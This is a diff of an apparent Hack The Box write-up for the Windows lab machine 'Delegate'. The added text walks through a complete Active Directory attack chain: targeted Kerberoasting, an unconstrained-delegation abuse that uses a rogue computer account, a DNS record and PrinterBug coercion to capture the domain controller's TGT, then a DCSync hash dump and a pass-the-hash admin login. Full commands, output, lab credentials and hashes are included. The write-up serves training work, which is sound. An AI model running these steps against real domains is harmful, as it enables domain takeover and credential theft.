@@ -5,7 +5,7 @@ categories: [HTB Writeup]
 media_subpath: /assets/posts/2025-09-12-htb-delegate/
 <!-- image: -->
 <!--   path: delegate.png -->
-tags: [htb, windows]
+tags: [htb, windows, nmap, netexec, smbclient, bloodyAD, bloodhound-ce-python, targetedKerberoast-py, hashcat, evil-winrm, addcomputer-py, dnstool-py, nslookup, addspn-py, pypykatz, krbrelayx-py, printerbug-py, secretsdump-py, credential-harvesting, dacl-abuse, shadow-credentials, targeted-kerberoasting, unconstrained-delegation, dcsync, SeEnableDelegationPrivilege]
 ---
 
 ![](delegate.png)
@@ -13,6 +13,22 @@ tags: [htb, windows]
 {: .centered }
 |**OS**|**Difficult**|
 |Windows|Medium|
+
+_Tools Used_\
+`nmap`, `netexec`, `smbclient`, `bloodyAD`, `bloodhound-ce-python`, `targetedKerberoast.py`, `hashcat`, `evil-winrm`, `addcomputer.py`, `dnstool.py`, `nslookup`, `addspn.py`, `pypykatz`, `krbrelayx.py`, `printerbug.py`, `secretsdump.py`
+
+## Attack Summary
+1. Ran `nxc` and identified guest login was enabled.
+2. Ran `smbclient` to enumerate the shares and found valid credentials for `a.briggs`.
+3. Identified `a.briggs` had `GenericWrite` over `n.thompson` in BloodHound.
+4. Performed Targeted Kerberosting attack against `n.thompson` and cracked its password.
+5. Logged in via WinRM as `n.thompson`.
+6. Identified `n.thompson` has `SeEnableDelegationPrivilege` privilege.
+7. Performed unconstrained delegation attack against the DC, and acquired its TGT.
+8. Performed DCSync attack against the DC using the TGT.
+9. Logged in as `Administrator` using the dumped hash.
+
+---
 
 ## Recon
 
@@ -137,7 +153,7 @@ SMB         10.129.234.69   445    DC1              NETLOGON        READ        
 SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
 ```
 
-I ran `smbclient` to enumerate the content of the NETLOGON share which normally contains user logon scripts if any.
+I ran `smbclient` to enumerate the content of the NETLOGON share which normally contains user logon scripts if there is any.
 ```
 ❯ smbclient -N //10.129.234.69/NETLOGON
 Try "help" to get a list of possible commands.
@@ -171,7 +187,7 @@ SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Buil
 SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
 ```
 
-I then proceeded to credentialed enumeration. First I wanted to know what privileges the compromised user account possessed. Various tools are good for this task, I like `BloodyAD` for its versatility and intuitive commandline design.
+I then proceeded to credentialed enumeration. First I wanted to know what privileges the compromised user account possessed. Various tools are good for this task, I like `bloodyAD` for its versatility and intuitive commandline design.
 ```
 ❯ bloodyAD -u a.briggs -p 'P4ssw0rd1#123' --dc-ip 10.129.234.69 get writable
 
@@ -212,12 +228,12 @@ INFO: Done in 00M 38S
 INFO: Compressing output into 20250912200539_bloodhound.zip
 ```
 
-I uploaded the zip into the BloodHound-CE. I marked `a.briggs` as owned, then ran "Shortest paths from Owned objects" pre-built Cypher query, and found `a.briggs` had `GenericWrite` to `n.thompson` who was in `REMOTE MANAGEMENT USERS` group.\
+I uploaded the zip into the BloodHound-CE, marked `a.briggs` as owned, then ran "Shortest paths from Owned objects" pre-built Cypher query. I found that `a.briggs` had `GenericWrite` permission over `n.thompson`, who was a member of the `REMOTE MANAGEMENT USERS` group.\
 ![](bh-abriggs-to-nthompson.png)
 
 ### (fail) Shadow Credentials Attack
 
-It was tempting to run shadow credentials attack against `n.thompson`. However, when I tried so I encountered `KDC_ERR_PADATA_TYPE_NOSUPP` error. This is because ADCS or CA were not configured in the Domain Controller, and the DC did not have its own key pair.
+It was tempting to run shadow credentials attack against `n.thompson`. However, when I tried so I encountered `KDC_ERR_PADATA_TYPE_NOSUPP` error. This is because ADCS or CA were not configured in the domain, and the DC did not have its own key pair.
 >Prerequisites for shadow credentials attack:
 >1. be in a domain that supports PKINIT and containing at least one Domain Controller running Windows Server 2016 or above.
 >2. be in a domain where the Domain Controller(s) has its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled or when a certificate authority (CA) is in place).
@@ -318,3 +334,206 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 ### Unconstrained Delegation Attack
 
 The plan is to trick the domain controller into authenticating to a service hosted on a domain-joined computer configured with unconstrained delegation, while the attack machine impersonates that computer. This would allow the attack machine to capture the domain controller's TGT.
+
+I needed to first create a domain-joined computer, assign it unconstrained delegation using the `SeEnableDelegationPrivilege`, then add a malicious DNS record to redirect authentication traffic to the attack machine.
+
+Before executing the attack, I needed to verify that the conditions were met.
+
+I ran `nxc` to confirm that the user was able to create a new computer.
+```
+❯ nxc ldap 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341' -M maq
+LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
+LDAP        10.129.234.69   389    DC1              [+] delegate.vl\n.thompson:KALEB_2341
+MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccountQuota
+MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
+```
+
+I ran `nxc` again to confirm that the DC was vulnerable to coercion attacks, which allow it to be coerced into authenticating to a target service.
+```
+❯ netexec smb dc1.delegate.vl -u tester$ -p Password1 -M coerce_plus
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.69   445    DC1              [+] delegate.vl\tester$:Password1
+COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, DFSCoerce
+COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PetitPotam
+COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
+COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
+COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, MSEven
+```
+
+With the basic enumeration complete, the attack seemed feasible. I then proceeded to execute the attack.
+
+I ran `addcomputer.py` to create a new computer account.
+```
+❯ addcomputer.py -computer-name tester$ -computer-pass Password1 delegate.vl/n.thompson:KALEB_2341
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account tester$ with password Password1.
+```
+
+I ran `dnstool.py` to add a malicous DNS record pointing to the attack machine.
+```
+❯ python tools/krbrelayx/dnstool.py -u 'delegate.vl\tester$' -p Password1 -r tester.delegate.vl -d 10.10.14.21 --action add 10.129.234.69
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+I waited a few minutes for the DNS record to update and then verified that it was working.
+```
+❯ nslookup tester.delegate.vl 10.129.234.69
+Server:         10.129.234.69
+Address:        10.129.234.69#53
+
+Name:   tester.delegate.vl
+Address: <ATTACKER IP>
+```
+
+I ran `addspn.py` to add a SPN to the computer account, but it returned an error and suggested using the `--additional` switch.
+```
+❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ --spn 'cifs/tester.delegate.vl' -dc-ip 10.129.234.69 dc1.delegate.vl
+
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[!] Could not modify object, the server reports a constrained violation
+[!] You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)
+[!] To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute
+```
+
+I ran again with the switch and it worked.
+
+```
+❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ --spn 'cifs/tester.delegate.vl' -dc-ip 10.129.234.69 dc1.delegate.vl --additional
+
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+
+❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ -q -dc-ip 10.129.234.69 dc1.delegate.vl
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+DN: CN=tester,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-09-12T08:49:03.316786
+    msDS-AdditionalDnsHostName: tester.delegate.vl  <---
+    sAMAccountName: tester$
+```
+
+I ran the original command again and this time it worked, the SPN was successfully added.
+```
+❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ --spn 'cifs/tester.delegate.vl' -dc-ip 10.129.234.69 dc1.delegate.vl
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+
+htb/labs/Delegate took 2s
+❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ -q -dc-ip 10.129.234.69 dc1.delegate.vl
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+DN: CN=tester,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-10-05T08:52:28.185602
+    msDS-AdditionalDnsHostName: tester.delegate.vl
+    sAMAccountName: tester$
+    servicePrincipalName: cifs/tester.delegate.vl  <---
+```
+
+Next, I used `bloodyAD` to add the unconstrained delegation flag to the computer account.
+```
+❯ bloodyAD -u n.thompson -p 'KALEB_2341' --dc-ip 10.129.234.69 add uac tester$ -f TRUSTED_FOR_DELEGATION
+[-] ['TRUSTED_FOR_DELEGATION'] property flags added to tester$'s userAccountControl
+
+❯ bloodyAD -u n.thompson -p 'KALEB_2341' --dc-ip 10.129.234.69 get object tester$ --attr userAccountControl
+distinguishedName: CN=tester,CN=Computers,DC=delegate,DC=vl
+userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION  <---
+```
+
+To catch the Kerberos authentication from the DC and extract the TGT, I ran `krbrelayx` on the attack machine, and supplied it with the malicious computer account’s NTLM hash. The NTLM hash is simply the MD4 hash of the password in UTF-16LE format. There are various ways to obtain it, but I like using `pypykatz` as it is convenient.
+```
+❯ pypykatz crypto nt Password1
+64f12cddaa88057e06a81b54e73b949b
+```
+```
+❯ python tools/krbrelayx/krbrelayx.py -hashes :64f12cddaa88057e06a81b54e73b949b
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
+[*] Running in unconstrained delegation abuse mode using the specified credentials.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+
+[*] Servers started, waiting for connections
+```
+
+I then ran `printerbug.py` against the DC to coerce it into authenticating to `tester.delegate.vl`. Note that it is important to specify the FQDN rather than just IP address.
+```
+❯ python tools/krbrelayx/printerbug.py delegate.vl/n.thompson:KALEB_2341@dc1.delegate.vl tester.delegate.vl
+[*] Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl
+[*] Bind OK
+[*] Got handle
+DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Triggered RPC backconnect, this may or may not have worked
+```
+
+The TGT for the DC was captured and saved.
+```
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.129.234.69
+[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
+[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache  <---
+[*] SMBD: Received connection from 10.129.234.69
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] SMBD: Received connection from 10.129.234.69
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+```
+
+### DCSync Attack
+
+With the ticket, I ran `secretsdump.py` to perform a DCSync attack against the DC and dumped the NTDS database.
+```
+❯ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache secretsdump.py delegate.vl/'DC1$'@dc1.delegate.vl -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
+A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
+b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
+R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
+J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
+N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
+tester$:4601:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+<SNIP>
+```
+
+Then I logged in via WinRM as `Administrator` using the dumped hash.
+```
+❯ evil-winrm -i 10.129.234.69 -u administrator -H c32198ceab4cc695e65045562aa3ee93
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
+20c3c***************************
+```
